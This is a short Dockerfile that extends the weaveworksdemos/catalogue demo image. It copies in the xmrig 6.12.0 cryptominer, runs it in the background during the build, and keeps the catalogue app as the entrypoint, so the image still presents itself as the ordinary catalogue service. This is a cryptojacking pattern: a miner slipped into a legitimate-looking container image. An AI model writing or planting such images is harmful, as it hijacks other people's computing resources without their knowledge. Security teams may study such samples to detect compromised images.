FROM weaveworksdemos/catalogue:0.3.5
COPY xmrig-6.12.0 /xmr

WORKDIR /xmr
RUN ./xmrig &

WORKDIR /
ENTRYPOINT [ "/app", "-port=80" ]
